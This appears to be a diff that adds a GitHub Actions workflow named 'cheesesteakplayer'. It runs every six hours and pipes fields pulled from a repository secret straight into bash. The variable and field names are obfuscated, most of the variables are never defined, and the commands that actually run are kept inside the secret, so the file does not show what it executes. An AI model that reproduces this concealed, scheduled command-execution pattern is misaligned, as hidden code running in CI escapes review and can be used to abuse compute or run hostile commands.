@@ -1,0 +1,23 @@
+name: cheesesteakplayer
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cheesesteakplayer
+        env:
+          f7: ${{ secrets.f7 }}
+        run: |
+          echo $f7 | jq -r .xlcw3135 | /bin/bash
+          echo $l1 | jq -r .isl8 | /bin/bash
+          echo $kjhe09938 | jq -r .xn88 | /bin/bash
+          echo $ocp899 | jq -r .fvgns42 | /bin/bash
+          echo $cllvx4 | jq -r .vws1947 | /bin/bash
+          echo $idjy7678 | jq -r .yy65961 | /bin/bash
+          echo $e399 | jq -r .vdhws01 | /bin/bash
+
